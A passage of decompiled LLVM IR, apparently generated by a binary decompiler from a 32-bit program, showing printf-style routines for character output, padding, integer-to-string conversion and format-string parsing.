  uselistorder label %dec_label_pc_8048686, { 1, 0 }
  uselistorder label %dec_label_pc_804867e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048663, { 1, 0 }
  uselistorder label %dec_label_pc_804863b, { 1, 0 }
}

define i32 @function_80486bb(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80486bb:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_80486c1 = icmp eq i32* %arg1, null
  br i1 %v4_80486c1, label %dec_label_pc_80486e0, label %dec_label_pc_80486c7

dec_label_pc_80486c7:                             ; preds = %dec_label_pc_80486bb
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_80486ca = load i32, i32* %arg1, align 4
  %v3_80486cf = inttoptr i32 %v2_80486ca to i8*
  store i8 %tmp8, i8* %v3_80486cf, align 1
  %v2_80486d4 = load i32, i32* %arg1, align 4
  %v1_80486d6 = add i32 %v2_80486d4, 1
  store i32 %v1_80486d6, i32* @edx, align 4
  store i32 %v1_80486d6, i32* %arg1, align 4
  br label %dec_label_pc_80486f3

dec_label_pc_80486e0:                             ; preds = %dec_label_pc_80486bb
  %v3_80486eb = bitcast i8* %stack_var_8 to i32*
  %v4_80486eb = call i32 @function_80504fc(i32 1, i32* %v3_80486eb, i32 1)
  br label %dec_label_pc_80486f3

dec_label_pc_80486f3:                             ; preds = %dec_label_pc_80486c7, %dec_label_pc_80486e0
  %v0_80486f4 = phi i32 [ %tmp3, %dec_label_pc_80486c7 ], [ %v4_80486eb, %dec_label_pc_80486e0 ]
  ret i32 %v0_80486f4

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_80486f3, { 1, 0 }
}

define i32 @function_80486f5(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80486f5:
  %tmp23 = icmp slt i32 %arg3, 1
  br i1 %tmp23, label %dec_label_pc_8048755, label %dec_label_pc_804870f

dec_label_pc_804870f:                             ; preds = %dec_label_pc_80486f5
  %v4_8048716 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8048716, i32* @edx, align 4
  %v2_804872754 = load i8, i8* %arg2, align 1
  %v3_804872755 = zext i8 %v2_804872754 to i32
  %v5_804872756 = and i32 %v4_8048716, -256
  %v6_804872757 = or i32 %v3_804872755, %v5_804872756
  %v4_804872958 = icmp eq i8 %v2_804872754, 0
  %v1_804872b59 = icmp eq i1 %v4_804872958, false
  br i1 %v1_804872b59, label %dec_label_pc_804871e, label %dec_label_pc_804872d

dec_label_pc_804871e:                             ; preds = %dec_label_pc_804870f, %dec_label_pc_804871e
  %v6_804872762 = phi i32 [ %v6_8048727, %dec_label_pc_804871e ], [ %v6_804872757, %dec_label_pc_804870f ]
  %v4_804872461 = phi i32 [ %v5_8048721, %dec_label_pc_804871e ], [ %v4_8048716, %dec_label_pc_804870f ]
  %stack_var_-12.060 = phi i32 [ %v4_804871e, %dec_label_pc_804871e ], [ 0, %dec_label_pc_804870f ]
  %v4_804871e = add i32 %stack_var_-12.060, 1
  %v5_8048721 = add i32 %v4_804872461, 1
  %v22_8048721 = inttoptr i32 %v5_8048721 to i8*
  store i32 %v5_8048721, i32* @edx, align 4
  %v2_8048727 = load i8, i8* %v22_8048721, align 1
  %v3_8048727 = zext i8 %v2_8048727 to i32
  %v5_8048727 = and i32 %v6_804872762, -256
  %v6_8048727 = or i32 %v3_8048727, %v5_8048727
  %v4_8048729 = icmp eq i8 %v2_8048727, 0
  %v1_804872b = icmp eq i1 %v4_8048729, false
  br i1 %v1_804872b, label %dec_label_pc_804871e, label %dec_label_pc_804872d

dec_label_pc_804872d:                             ; preds = %dec_label_pc_804871e, %dec_label_pc_804870f
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_804870f ], [ %v4_804871e, %dec_label_pc_804871e ]
  %v5_8048733 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_8048733, label %dec_label_pc_804873e, label %dec_label_pc_8048744

dec_label_pc_804873e:                             ; preds = %dec_label_pc_804872d
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_8048741 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_8048744

dec_label_pc_8048744:                             ; preds = %dec_label_pc_804872d, %dec_label_pc_804873e
  %storemerge = phi i32 [ %v5_8048741, %dec_label_pc_804873e ], [ 0, %dec_label_pc_804872d ]
  %v1_8048747 = and i32 %arg4, 2
  %tmp24 = mul nuw nsw i32 %v1_8048747, 8
  %tmp25 = or i32 %tmp24, 32
  br label %dec_label_pc_8048755

dec_label_pc_8048755:                             ; preds = %dec_label_pc_8048744, %dec_label_pc_80486f5
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_80486f5 ], [ %storemerge, %dec_label_pc_8048744 ]
  %stack_var_-16.0 = phi i32 [ 32, %dec_label_pc_80486f5 ], [ %tmp25, %dec_label_pc_8048744 ]
  %v1_8048758 = urem i32 %arg4, 2
  %v2_8048758 = icmp eq i32 %v1_8048758, 0
  %v1_804875d = icmp eq i1 %v2_8048758, false
  %.pre9 = inttoptr i32 %arg1 to i32*
  br i1 %v1_804875d, label %dec_label_pc_804879f.preheader, label %dec_label_pc_8048778.preheader

dec_label_pc_8048778.preheader:                   ; preds = %dec_label_pc_8048755
  %tmp2647 = icmp slt i32 %stack_var_12.0, 1
  %tmp2748 = icmp eq i1 %tmp2647, false
  br i1 %tmp2748, label %dec_label_pc_8048761.lr.ph, label %dec_label_pc_804879f.preheader

dec_label_pc_8048761.lr.ph:                       ; preds = %dec_label_pc_8048778.preheader
  br label %dec_label_pc_8048761

dec_label_pc_8048761:                             ; preds = %dec_label_pc_8048761.lr.ph, %dec_label_pc_8048761
  %stack_var_-20.050 = phi i32 [ 0, %dec_label_pc_8048761.lr.ph ], [ %v4_8048772, %dec_label_pc_8048761 ]
  %stack_var_12.149 = phi i32 [ %stack_var_12.0, %dec_label_pc_8048761.lr.ph ], [ %v4_8048775, %dec_label_pc_8048761 ]
  %v3_804876a = call i32 @function_80486bb(i32* %.pre9, i32 %stack_var_-16.0)
  %v4_8048772 = add i32 %stack_var_-20.050, 1
  %v4_8048775 = add i32 %stack_var_12.149, -1
  %tmp26 = icmp slt i32 %v4_8048775, 1
  %tmp27 = icmp eq i1 %tmp26, false
  br i1 %tmp27, label %dec_label_pc_8048761, label %dec_label_pc_804879f.preheader

dec_label_pc_804879f.preheader:                   ; preds = %dec_label_pc_8048778.preheader, %dec_label_pc_8048761, %dec_label_pc_8048755
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048755 ], [ %stack_var_12.0, %dec_label_pc_8048778.preheader ], [ %v4_8048775, %dec_label_pc_8048761 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048755 ], [ 0, %dec_label_pc_8048778.preheader ], [ %v4_8048772, %dec_label_pc_8048761 ]
  %v2_80487a236 = load i8, i8* %arg2, align 1
  %v4_80487a440 = icmp eq i8 %v2_80487a236, 0
  %v1_80487a641 = icmp eq i1 %v4_80487a440, false
  br i1 %v1_80487a641, label %dec_label_pc_8048780.lr.ph, label %dec_label_pc_80487c1.preheader

dec_label_pc_8048780.lr.ph:                       ; preds = %dec_label_pc_804879f.preheader
  %v4_804879f35 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_8048780

dec_label_pc_8048780:                             ; preds = %dec_label_pc_8048780.lr.ph, %dec_label_pc_8048780
  %v4_804879f44 = phi i32 [ %v4_804879f35, %dec_label_pc_8048780.lr.ph ], [ %v5_804879c, %dec_label_pc_8048780 ]
  %stack_var_-20.143 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8048780.lr.ph ], [ %v4_8048799, %dec_label_pc_8048780 ]
  %stack_var_8.042 = phi i8* [ %arg2, %dec_label_pc_8048780.lr.ph ], [ %v22_804879c, %dec_label_pc_8048780 ]
  %v2_8048783 = load i8, i8* %stack_var_8.042, align 1
  %v3_8048783 = zext i8 %v2_8048783 to i32
  %v3_8048791 = call i32 @function_80486bb(i32* %.pre9, i32 %v3_8048783)
  %v4_8048799 = add i32 %stack_var_-20.143, 1
  %v5_804879c = add i32 %v4_804879f44, 1
  %v22_804879c = inttoptr i32 %v5_804879c to i8*
  %v2_80487a2 = load i8, i8* %v22_804879c, align 1
  %v4_80487a4 = icmp eq i8 %v2_80487a2, 0
  %v1_80487a6 = icmp eq i1 %v4_80487a4, false
  br i1 %v1_80487a6, label %dec_label_pc_8048780, label %dec_label_pc_80487c1.preheader

dec_label_pc_80487c1.preheader:                   ; preds = %dec_label_pc_8048780, %dec_label_pc_804879f.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804879f.preheader ], [ %v4_8048799, %dec_label_pc_8048780 ]
  %tmp2831 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp2932 = icmp eq i1 %tmp2831, false
  br i1 %tmp2932, label %dec_label_pc_80487aa.lr.ph, label %dec_label_pc_80487c7

dec_label_pc_80487aa.lr.ph:                       ; preds = %dec_label_pc_80487c1.preheader
  br label %dec_label_pc_80487aa

dec_label_pc_80487aa:                             ; preds = %dec_label_pc_80487aa.lr.ph, %dec_label_pc_80487aa
  %stack_var_-20.234 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_80487aa.lr.ph ], [ %v4_80487bb, %dec_label_pc_80487aa ]
  %stack_var_12.333 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_80487aa.lr.ph ], [ %v4_80487be, %dec_label_pc_80487aa ]
  %v3_80487b3 = call i32 @function_80486bb(i32* %.pre9, i32 %stack_var_-16.0)
  %v4_80487bb = add i32 %stack_var_-20.234, 1
  %v4_80487be = add i32 %stack_var_12.333, -1
  %tmp28 = icmp slt i32 %v4_80487be, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_80487aa, label %dec_label_pc_80487c7

dec_label_pc_80487c7:                             ; preds = %dec_label_pc_80487aa, %dec_label_pc_80487c1.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_80487c1.preheader ], [ %v4_80487bb, %dec_label_pc_80487aa ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_804879c, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_8048721, { 1, 2, 0 }
  uselistorder i32 %v4_8048716, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_80487aa, { 1, 0 }
  uselistorder label %dec_label_pc_8048780, { 1, 0 }
  uselistorder label %dec_label_pc_804879f.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048761, { 1, 0 }
  uselistorder label %dec_label_pc_8048744, { 1, 0 }
  uselistorder label %dec_label_pc_804871e, { 1, 0 }
}

define i32 @function_80487cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_80487cc:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_80487e3 = sext i32 %tmp35 to i64
  %v4_80487e6 = icmp eq i32 %tmp35, 0
  %v5_80487e6 = icmp slt i32 %tmp35, 0
  %v1_80487ea = icmp eq i1 %v4_80487e6, false
  br i1 %v1_80487ea, label %dec_label_pc_8048811, label %dec_label_pc_80487ec

dec_label_pc_80487ec:                             ; preds = %dec_label_pc_80487cc
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_8048801 = call i32 @function_80486f5(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_80488ec

dec_label_pc_8048811:                             ; preds = %dec_label_pc_80487cc
  %v4_8048811 = icmp eq i32 %tmp28, 0
  br i1 %v4_8048811, label %dec_label_pc_8048832, label %dec_label_pc_8048817

dec_label_pc_8048817:                             ; preds = %dec_label_pc_8048811
  %v12_8048817 = icmp eq i32 %tmp27, 10
  %v1_804881b = icmp eq i1 %v12_8048817, false
  br i1 %v1_804881b, label %dec_label_pc_8048832, label %dec_label_pc_804881d

dec_label_pc_804881d:                             ; preds = %dec_label_pc_8048817
  %v1_8048821 = icmp eq i1 %v5_80487e6, false
  br i1 %v1_8048821, label %dec_label_pc_8048832, label %dec_label_pc_8048823

dec_label_pc_8048823:                             ; preds = %dec_label_pc_804881d
  %v1_804882d = sub i32 0, %tmp35
  %v5_804882f = sext i32 %v1_804882d to i64
  br label %dec_label_pc_8048832

dec_label_pc_8048832:                             ; preds = %dec_label_pc_804881d, %dec_label_pc_8048817, %dec_label_pc_8048811, %dec_label_pc_8048823
  %stack_var_-24.0 = phi i64 [ %v5_80487e3, %dec_label_pc_8048811 ], [ %v5_80487e3, %dec_label_pc_8048817 ], [ %v5_80487e3, %dec_label_pc_804881d ], [ %v5_804882f, %dec_label_pc_8048823 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_8048811 ], [ 0, %dec_label_pc_8048817 ], [ 0, %dec_label_pc_804881d ], [ 1, %dec_label_pc_8048823 ]
  %v15_8048835 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_80488937 = trunc i64 %stack_var_-24.0 to i32
  %v5_80488938 = icmp eq i32 %v4_80488937, 0
  %v1_804889715 = icmp eq i1 %v5_80488938, false
  br i1 %v1_804889715, label %dec_label_pc_8048843.lr.ph, label %dec_label_pc_8048899

dec_label_pc_8048843.lr.ph:                       ; preds = %dec_label_pc_8048832
  %v5_8048846 = sext i32 %tmp27 to i64
  %v5_8048862 = add i32 %tmp, 198
  br label %dec_label_pc_8048843

dec_label_pc_8048843:                             ; preds = %dec_label_pc_8048843.lr.ph, %dec_label_pc_804886b
  %v3_804886b18 = phi i8* [ %tmp48, %dec_label_pc_8048843.lr.ph ], [ %v22_804886b, %dec_label_pc_804886b ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048843.lr.ph ], [ %v5_8048890, %dec_label_pc_804886b ]
  %v6_8048851 = and i64 %stack_var_-24.116, 4294967295
  %v12_8048851 = udiv i64 %v6_8048851, %v5_8048846
  %v13_8048851 = trunc i64 %v12_8048851 to i32
  %v14_8048851 = urem i64 %v6_8048851, %v5_8048846
  %v5_8048856 = trunc i64 %v14_8048851 to i8
  %v7_804885d = icmp sgt i8 %v5_8048856, 9
  br i1 %v7_804885d, label %dec_label_pc_804885f, label %dec_label_pc_804886b

dec_label_pc_804885f:                             ; preds = %dec_label_pc_8048843
  %tmp52 = trunc i64 %v14_8048851 to i32
  %v1_8048865 = add i32 %v5_8048862, %tmp52
  %v11_8048865 = trunc i32 %v1_8048865 to i8
  br label %dec_label_pc_804886b

dec_label_pc_804886b:                             ; preds = %dec_label_pc_8048843, %dec_label_pc_804885f
  %stack_var_-36.0 = phi i8 [ %v11_8048865, %dec_label_pc_804885f ], [ %v5_8048856, %dec_label_pc_8048843 ]
  %v4_804886b = ptrtoint i8* %v3_804886b18 to i32
  %v5_804886b = add i32 %v4_804886b, -1
  %v22_804886b = inttoptr i32 %v5_804886b to i8*
  %v1_8048871 = add i8 %stack_var_-36.0, 48
  store i8 %v1_8048871, i8* %v22_804886b, align 1
  %v5_8048890 = sext i32 %v13_8048851 to i64
  %v5_8048893 = icmp eq i32 %v13_8048851, 0
  %v1_8048897 = icmp eq i1 %v5_8048893, false
  br i1 %v1_8048897, label %dec_label_pc_8048843, label %dec_label_pc_8048893.dec_label_pc_8048899_crit_edge

dec_label_pc_8048893.dec_label_pc_8048899_crit_edge: ; preds = %dec_label_pc_804886b
  store i8* %v22_804886b, i8** %stack_var_-40, align 4
  br label %dec_label_pc_8048899

dec_label_pc_8048899:                             ; preds = %dec_label_pc_8048893.dec_label_pc_8048899_crit_edge, %dec_label_pc_8048832
  %v3_80488d6622 = phi i32 [ %v5_804886b, %dec_label_pc_8048893.dec_label_pc_8048899_crit_edge ], [ %v15_8048835, %dec_label_pc_8048832 ]
  %v3_80488c7 = phi i8* [ %v22_804886b, %dec_label_pc_8048893.dec_label_pc_8048899_crit_edge ], [ %tmp48, %dec_label_pc_8048832 ]
  %v4_8048899 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_8048899, label %dec_label_pc_80488d0, label %dec_label_pc_804889f

dec_label_pc_804889f:                             ; preds = %dec_label_pc_8048899
  %v4_804889f = icmp eq i32 %tmp31, 0
  br i1 %v4_804889f, label %dec_label_pc_80488c7, label %dec_label_pc_80488a5

dec_label_pc_80488a5:                             ; preds = %dec_label_pc_804889f
  %v1_80488a8 = and i32 %tmp32, 2
  %v2_80488a8 = icmp eq i32 %v1_80488a8, 0
  br i1 %v2_80488a8, label %dec_label_pc_80488c7, label %dec_label_pc_80488af

dec_label_pc_80488af:                             ; preds = %dec_label_pc_80488a5
  %v3_80488b7 = inttoptr i32 %arg1 to i32*
  %v4_80488b7 = call i32 @function_80486bb(i32* %v3_80488b7, i32 45)
  %v4_80488c2 = add i32 %tmp31, -1
  br label %dec_label_pc_80488d0

dec_label_pc_80488c7:                             ; preds = %dec_label_pc_80488a5, %dec_label_pc_804889f
  %v4_80488c7 = ptrtoint i8* %v3_80488c7 to i32
  %v5_80488c7 = add i32 %v4_80488c7, -1
  %v22_80488c7 = inttoptr i32 %v5_80488c7 to i8*
  store i8* %v22_80488c7, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_80488c7, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80488d66.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_80488d0

dec_label_pc_80488d0:                             ; preds = %dec_label_pc_8048899, %dec_label_pc_80488af, %dec_label_pc_80488c7
  %v3_80488d66 = phi i32 [ %v3_80488d6622, %dec_label_pc_8048899 ], [ %v3_80488d66.pre, %dec_label_pc_80488c7 ], [ %v3_80488d6622, %dec_label_pc_80488af ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_8048899 ], [ %tmp31, %dec_label_pc_80488c7 ], [ %v4_80488c2, %dec_label_pc_80488af ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048899 ], [ 0, %dec_label_pc_80488c7 ], [ 1, %dec_label_pc_80488af ]
  %v1_80488dc.cast = inttoptr i32 %v3_80488d66 to i8*
  %v6_80488dc = call i32 @function_80486f5(i32 %arg1, i8* %v1_80488dc.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_80488e7 = add i32 %v6_80488dc, %stack_var_-28.0
  store i32 %v2_80488e7, i32* @edx, align 4
  br label %dec_label_pc_80488ec

dec_label_pc_80488ec:                             ; preds = %dec_label_pc_80487ec, %dec_label_pc_80488d0
  %storemerge = phi i32 [ %v2_80488e7, %dec_label_pc_80488d0 ], [ %v6_8048801, %dec_label_pc_80487ec ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_804886b, { 0, 1, 3, 2 }
  uselistorder i8 %v5_8048856, { 1, 0 }
  uselistorder i64 %v6_8048851, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80488ec, { 1, 0 }
  uselistorder label %dec_label_pc_80488d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804886b, { 1, 0 }
  uselistorder label %dec_label_pc_8048843, { 1, 0 }
  uselistorder label %dec_label_pc_8048832, { 3, 0, 1, 2 }
}

define i32 @function_80488f1(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80488f1:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80488f1 = load i32, i32* @ebp, align 4
  store i32 %v0_80488f1, i32* %stack_var_-4, align 4
  %v15_80488f4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048ae6 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.442 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8048b1c43 = load i8, i8* %stack_var_8.442, align 1
  %v3_8048b1c44 = zext i8 %v2_8048b1c43 to i32
  %v5_8048b1c45 = and i32 %arg2, -256
  %v6_8048b1c46 = or i32 %v3_8048b1c44, %v5_8048b1c45
  store i32 %v6_8048b1c46, i32* %eax.global-to-local, align 4
  %v4_8048b1e47 = icmp eq i8 %v2_8048b1c43, 0
  %v1_8048b2048 = icmp eq i1 %v4_8048b1e47, false
  br i1 %v1_8048b2048, label %dec_label_pc_8048903, label %dec_label_pc_8048b26

dec_label_pc_8048903:                             ; preds = %dec_label_pc_80488f1, %dec_label_pc_8048b16
  %v0_8048b04 = phi i32 [ %v4_80489c864, %dec_label_pc_8048b16 ], [ %v15_80488f4, %dec_label_pc_80488f1 ]
  %v5_8048b1c54 = phi i32 [ %v5_8048b1c, %dec_label_pc_8048b16 ], [ %v5_8048b1c45, %dec_label_pc_80488f1 ]
  %stack_var_8.453 = phi i8* [ %stack_var_8.4, %dec_label_pc_8048b16 ], [ %stack_var_8.442, %dec_label_pc_80488f1 ]
  %stack_var_-28.152 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8048b16 ], [ 0, %dec_label_pc_80488f1 ]
  %stack_var_8.4.in51 = phi i32 [ %v5_8048b16, %dec_label_pc_8048b16 ], [ %arg2, %dec_label_pc_80488f1 ]
  %stack_var_12.150 = phi i32 [ %stack_var_12.0, %dec_label_pc_8048b16 ], [ %arg3, %dec_label_pc_80488f1 ]
  %stack_var_-24.149 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8048b16 ], [ %tmp5, %dec_label_pc_80488f1 ]
  store i32 %stack_var_8.4.in51, i32* %eax.global-to-local, align 4
  %v2_8048906 = load i8, i8* %stack_var_8.453, align 1
  %v3_8048906 = zext i8 %v2_8048906 to i32
  %v6_8048906 = or i32 %v3_8048906, %v5_8048b1c54
  store i32 %v6_8048906, i32* %eax.global-to-local, align 4
  %v10_8048908 = icmp eq i8 %v2_8048906, 37
  %v1_804890a = icmp eq i1 %v10_8048908, false
  br i1 %v1_804890a, label %dec_label_pc_8048afa, label %dec_label_pc_8048910

dec_label_pc_8048910:                             ; preds = %dec_label_pc_8048903
  %v5_8048910 = add i32 %stack_var_8.4.in51, 1
  %v22_8048910 = inttoptr i32 %v5_8048910 to i8*
  store i32 %v5_8048910, i32* %eax.global-to-local, align 4
  %v2_8048923 = load i8, i8* %v22_8048910, align 1
  %v3_8048923 = zext i8 %v2_8048923 to i32
  %v5_8048923 = and i32 %v5_8048910, -256
  %v6_8048923 = or i32 %v3_8048923, %v5_8048923
  store i32 %v6_8048923, i32* %eax.global-to-local, align 4
  %v4_8048925 = icmp eq i8 %v2_8048923, 0
  br i1 %v4_8048925, label %dec_label_pc_8048b26, label %dec_label_pc_804892d

dec_label_pc_804892d:                             ; preds = %dec_label_pc_8048910
  store i32 %v5_8048910, i32* %eax.global-to-local, align 4
  %v2_8048930 = load i8, i8* %v22_8048910, align 1
  %v3_8048930 = zext i8 %v2_8048930 to i32
  %v6_8048930 = or i32 %v3_8048930, %v5_8048923
  store i32 %v6_8048930, i32* %eax.global-to-local, align 4
  %v10_8048932 = icmp eq i8 %v2_8048930, 37
  br i1 %v10_8048932, label %dec_label_pc_8048afa, label %dec_label_pc_804893a

dec_label_pc_804893a:                             ; preds = %dec_label_pc_804892d
  store i32 %v5_8048910, i32* %eax.global-to-local, align 4
  %v2_804893d = load i8, i8* %v22_8048910, align 1
  %v3_804893d = zext i8 %v2_804893d to i32
  %v6_804893d = or i32 %v3_804893d, %v5_8048923
  store i32 %v6_804893d, i32* %eax.global-to-local, align 4
  %v10_804893f = icmp eq i8 %v2_804893d, 45
  %v1_8048941 = icmp eq i1 %v10_804893f, false
  br i1 %v1_8048941, label %dec_label_pc_8048956.preheader, label %dec_label_pc_8048943

dec_label_pc_8048943:                             ; preds = %dec_label_pc_804893a
  %v5_8048943 = add i32 %stack_var_8.4.in51, 2
  %v22_8048943 = inttoptr i32 %v5_8048943 to i8*
  br label %dec_label_pc_8048956.preheader

dec_label_pc_8048956.preheader:                   ; preds = %dec_label_pc_8048943, %dec_label_pc_804893a
  %stack_var_8.0.ph = phi i8* [ %v22_8048910, %dec_label_pc_804893a ], [ %v22_8048943, %dec_label_pc_8048943 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804893a ], [ 1, %dec_label_pc_8048943 ]
  %v4_804895615 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804895615, i32* %eax.global-to-local, align 4
  %v2_804895916 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804895917 = zext i8 %v2_804895916 to i32
  %v5_804895918 = and i32 %v4_804895615, -256
  %v6_804895919 = or i32 %v3_804895917, %v5_804895918
  store i32 %v6_804895919, i32* %eax.global-to-local, align 4
  %v7_804895b20 = icmp eq i8 %v2_804895916, 48
  br i1 %v7_804895b20, label %dec_label_pc_804894f, label %dec_label_pc_8048985.preheader

dec_label_pc_804894f:                             ; preds = %dec_label_pc_8048956.preheader, %dec_label_pc_804894f
  %v4_804895622 = phi i32 [ %v5_804894f, %dec_label_pc_804894f ], [ %v4_804895615, %dec_label_pc_8048956.preheader ]
  %stack_var_-32.021 = phi i32 [ %v4_8048952, %dec_label_pc_804894f ], [ %stack_var_-32.0.ph, %dec_label_pc_8048956.preheader ]
  %v5_804894f = add i32 %v4_804895622, 1
  %v22_804894f = inttoptr i32 %v5_804894f to i8*
  %v4_8048952 = or i32 %stack_var_-32.021, 2
  store i32 %v5_804894f, i32* %eax.global-to-local, align 4
  %v2_8048959 = load i8, i8* %v22_804894f, align 1
  %v3_8048959 = zext i8 %v2_8048959 to i32
  %v5_8048959 = and i32 %v5_804894f, -256
  %v6_8048959 = or i32 %v3_8048959, %v5_8048959
  store i32 %v6_8048959, i32* %eax.global-to-local, align 4
  %v7_804895b = icmp eq i8 %v2_8048959, 48
  br i1 %v7_804895b, label %dec_label_pc_804894f, label %dec_label_pc_8048985.preheader

dec_label_pc_8048985.preheader:                   ; preds = %dec_label_pc_804894f, %dec_label_pc_8048956.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_8048956.preheader ], [ %v4_8048952, %dec_label_pc_804894f ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_8048956.preheader ], [ %v22_804894f, %dec_label_pc_804894f ]
  %v4_804898524 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_804898524, i32* %eax.global-to-local, align 4
  %v2_804898825 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_804898826 = zext i8 %v2_804898825 to i32
  %v5_804898827 = and i32 %v4_804898524, -256
  %v6_804898828 = or i32 %v3_804898826, %v5_804898827
  store i32 %v6_804898828, i32* %eax.global-to-local, align 4
  %tmp65 = icmp ult i8 %v2_804898825, 48
  br i1 %tmp65, label %dec_label_pc_8048997, label %dec_label_pc_804898e

dec_label_pc_8048961:                             ; preds = %dec_label_pc_804898e
  %v2_804896a = mul i32 %stack_var_-36.030, 10
  store i32 %v4_804898532, i32* %eax.global-to-local, align 4
  %v2_8048972 = load i8, i8* %stack_var_8.131, align 1
  %v3_8048972 = zext i8 %v2_8048972 to i32
  %v5_8048979 = add i32 %v2_804896a, -48
  %v1_804897c = add i32 %v5_8048979, %v3_8048972
  %v5_8048982 = add i32 %v4_804898532, 1
  %v22_8048982 = inttoptr i32 %v5_8048982 to i8*
  store i32 %v5_8048982, i32* %eax.global-to-local, align 4
  %v2_8048988 = load i8, i8* %v22_8048982, align 1
  %v3_8048988 = zext i8 %v2_8048988 to i32
  %v5_8048988 = and i32 %v5_8048982, -256
  %v6_8048988 = or i32 %v3_8048988, %v5_8048988
  store i32 %v6_8048988, i32* %eax.global-to-local, align 4
  %tmp66 = icmp ult i8 %v2_8048988, 48
  br i1 %tmp66, label %dec_label_pc_8048997, label %dec_label_pc_804898e

dec_label_pc_804898e:                             ; preds = %dec_label_pc_8048985.preheader, %dec_label_pc_8048961
  %v5_804898833 = phi i32 [ %v5_8048988, %dec_label_pc_8048961 ], [ %v5_804898827, %dec_label_pc_8048985.preheader ]
  %v4_804898532 = phi i32 [ %v5_8048982, %dec_label_pc_8048961 ], [ %v4_804898524, %dec_label_pc_8048985.preheader ]
